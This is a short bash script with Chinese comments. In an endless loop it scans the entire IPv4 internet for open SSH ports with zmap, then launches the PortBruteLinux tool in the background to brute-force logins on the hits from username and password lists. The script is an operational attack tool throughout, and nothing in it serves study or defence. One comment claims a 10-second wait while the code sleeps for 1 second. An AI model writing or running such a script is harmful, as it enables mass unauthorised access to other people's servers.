#!/bin/bash

# 函数：检查当前 CPU 使用率是否低于50%
check_cpu_usage() {
    cpu_usage=$(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100 - $1}')
    if (( $(echo "$cpu_usage < 50" | bc -l) )); then
        return 0  # CPU 使用率低于50%，返回0表示可以执行
    else
        return 1  # CPU 使用率超过50%，返回1表示不执行
    fi
}

# 无限循环，只要 CPU 使用率不低于50%，就等待10秒后再次检查
while true; do
    if check_cpu_usage; then
        echo "CPU 使用率低于50%，可以执行任务"
        
        # 判断目录是否存在，如果不存在则创建
        if [ ! -d "ssh" ]; then
            mkdir "ssh"
            echo "ssh 文件夹不存在，已创建"
        fi
        
        # 生成当前时间的时间戳，格式为年月日时分秒
        timestamp=$(date +"%Y%m%d%H%M%S")
        echo "开始扫描"

        # 执行 zmap 命令，保存结果到带有时间戳的文件
        zmap -p 22 0.0.0.0/0 -N 200 -B 1M -o "ssh/${timestamp}.txt"
        echo "扫描完成，扫描结果保存到 ssh/${timestamp}.txt"

        # 为IP添加端口信息
        sed -i 's/$/:22|SSH/' "ssh/${timestamp}.txt"

        current_dir=$(pwd)
        echo "为IP添加端口完成，开始爆破 ${current_dir}/ssh/${timestamp}.txt"

        # 启动 PortBruteLinux，并将输出重定向到日志文件
        nohup ./PortBruteLinux -f "ssh/${timestamp}.txt" -p pass.txt -t 100 -u user.txt >> PortBruteLinux.log &

    else
        echo "CPU 使用率超过50%，等待10秒后重新检查"
        sleep 1  # CPU 使用率超过50%，等待10秒后再次检查
    fi
done
